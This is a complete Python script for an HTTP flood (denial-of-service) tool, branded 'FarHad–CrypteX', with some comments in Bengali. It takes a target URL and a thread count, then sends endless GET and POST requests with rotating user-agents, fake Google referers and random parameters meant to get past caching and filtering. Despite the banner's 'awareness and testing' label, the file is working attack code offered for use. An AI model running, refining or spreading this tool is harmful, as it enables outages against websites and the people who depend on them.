import os
import threading
import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Init colorama
init(autoreset=True)
os.system('clear')

# ✅ ইউনিক ASCII লোগো
print(Fore.CYAN + '''
╔══════════════════════════════════════════════╗
║        ███████╗ █████╗ ██████╗ ██╗           ║
║        ██╔════╝██╔══██╗██╔══██╗██║           ║
║        █████╗  ███████║██████╔╝██║           ║
║        ██╔══╝  ██╔══██║██╔═══╝ ██║           ║
║        ██║     ██║  ██║██║     ███████╗      ║
║        ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝      ║
╠══════════════════════════════════════════════╣
║   FarHad–CrypteX  |  Islamic Cyber Network   ║
║       Tools For Cyber Awareness & Testing    ║
╚══════════════════════════════════════════════╝
''')

print(Fore.YELLOW + "\n[!] FARHAD CRYPTEX - ADVANCED FLOOD TOOL v2.0\n")

# ✅ ইনপুট নেওয়া হচ্ছে
url = input(Fore.GREEN + "Enter Target URL: ").strip()
threads = int(input(Fore.GREEN + "Enter number of threads: "))

# ✅ User-Agent List
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

success = 0
failed = 0
start_time = time.time()
lock = threading.Lock()
session = requests.Session()

# ✅ Random string generator
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ✅ Attack function
def attack():
    global success, failed
    while True:
        try:
            method = random.choice(['GET', 'POST'])  # চাইলে শুধু 'GET' করে রাখতে পারো
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': f"https://google.com/{random_string(5)}"
            }
            params = {random_string(5): random_string(8) for _ in range(3)}
            data = {random_string(5): random_string(8) for _ in range(3)}

            if method == 'GET':
                r = session.get(url, headers=headers, params=params, timeout=5)
            else:
                r = session.post(url, headers=headers, data=data, timeout=5)

            with lock:
                success += 1
                print(Fore.GREEN + f"[+] Sent {success} | Status: {r.status_code}")
        except:
            with lock:
                failed += 1
                print(Fore.RED + f"[-] Failed {failed}")

# ✅ স্ট্যাটস থ্রেড
def stats():
    while True:
        time.sleep(5)
        uptime = int(time.time() - start_time)
        print(Fore.MAGENTA + f"[STATS] Sent: {success} | Failed: {failed} | Uptime: {uptime}s")

# ✅ শুরু করা হচ্ছে
threading.Thread(target=stats, daemon=True).start()

with ThreadPoolExecutor(max_workers=threads) as executor:
    for _ in range(threads):
        executor.submit(attack)